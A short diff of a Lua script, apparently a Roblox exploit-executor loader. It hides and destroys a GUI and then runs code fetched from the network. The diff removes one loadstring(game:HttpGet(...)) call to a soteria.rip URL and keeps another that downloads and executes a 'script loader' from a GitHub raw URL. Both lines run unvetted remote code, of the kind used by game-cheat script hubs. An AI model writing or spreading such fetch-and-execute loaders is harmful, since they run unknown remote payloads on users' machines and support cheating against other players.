@@ -22,7 +22,6 @@ local hide = TweenService:Create(Image, TweenInfo.new(0.5), {ImageTransparency =
 hide:Play()
 task.wait(0.5)
 Gui:Destroy()
-loadstring(game:HttpGet("https://raw.soteria.rip/4eb20d3572b9ab80b51a6bed31301b74"))()
 local ok, matched = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/9178/refs/heads/main/恐脚本加载器"))()
 end)
